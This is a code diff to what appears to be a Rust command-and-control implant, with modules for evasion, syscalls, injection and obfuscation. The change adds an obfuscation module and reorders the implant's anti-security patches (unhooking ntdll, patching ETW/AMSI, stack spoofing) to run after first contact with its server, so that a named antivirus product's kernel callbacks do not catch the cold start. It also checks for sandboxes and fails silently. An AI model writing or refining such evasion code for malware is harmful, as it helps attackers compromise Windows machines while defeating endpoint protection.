@@ -17,6 +17,7 @@ mod channel;
 mod crypto;
 mod evasion;
 mod executor;
+mod obfs;
 mod task;
 mod syscall;
 mod inject;
@@ -57,12 +58,6 @@ fn main() {
     #[cfg(all(target_os = "windows", not(all(feature = "staged-payload", feature = "udrl"))))]
     let _ = crate::syscall::init();
 
-    // Evasion startup patches — applied before registration so they're in place
-    // before any network contact. Order: unhook first (restores clean syscall stubs),
-    // then ETW/AMSI (patches in-memory, depends on correct ntdll state), then
-    // stack-spoof init (scans ntdll for gadget).
-    evasion::startup_patches();
-
     if evasion::abort_if_sandboxed() {
         return;
     }
@@ -74,6 +69,10 @@ fn main() {
         Ok(s) => s,
         Err(_) => return, // silent failure — no output, no crash
     };
+
+    // Patches applied AFTER initial registration — cold start is clean so BD's
+    // kernel callbacks don't fire before we have a session.
+    evasion::startup_patches();
 
     // Main polling loop
     let mut sleep = SLEEP_SECS;
